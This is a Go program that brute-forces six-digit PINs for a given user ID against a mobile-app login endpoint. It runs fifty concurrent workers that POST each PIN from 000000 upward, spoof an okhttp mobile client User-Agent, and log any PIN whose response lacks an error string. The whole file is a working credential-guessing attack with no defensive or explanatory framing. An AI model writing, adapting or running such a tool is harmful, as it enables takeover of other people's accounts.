package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"strings"
	"os"
)

type Work struct {
	Req      *http.Request
	Password string
}

const MAX = 999999
const Threads = 50

var UserId string
var Uri string = "https://branch.localhost/gw/mob/uplFileMul"

func NewRequest(Password int) (*Work, error) {
	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	writer.WriteField("un", UserId)
	pwd := fmt.Sprintf("%06d", Password)
	writer.WriteField("pwd", pwd)
	writer.Close()
	req, err := http.NewRequest("POST", Uri, body)
	if err != nil {
		return &Work{}, err
	}
	req.Header.Set("User-Agent", "okhttp/3.14.9")
	return &Work{req, pwd}, nil
}

func Job(Pool <-chan *Work, Return chan<- error) {
	Client := new(http.Client)
	for w := range Pool {
		resp, err := Client.Do(w.Req)
		if err != nil {
			Return <- err
		}
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			Return <- err
		}
		resp.Body.Close()
		b := string(body)
		if !strings.Contains(b, "err") {
			log.Println(w.Password)
		}
		Return <- nil
	}
}

func main() {
	if len(os.Args) > 1 {
		UserId = os.Args[1]
	} else {
		fmt.Printf("A UserId must be supplied.\nUsage:\n\n\t%s <UserId>\n\n", os.Args[0])
		return
	}
	Pool := make(chan *Work, Threads)
	Return := make(chan error)

	for i := 0; i < Threads; i++ {
		go Job(Pool, Return)
	}
	go func() {
		for i := 0; i < MAX; i++ {
			Req, err := NewRequest(i)
			if err != nil {
				Return <- err
			}
			Pool <- Req
		}
	}()
	for err := range Return {
		if err != nil {
			log.Fatalln(err)
		}
	}
}
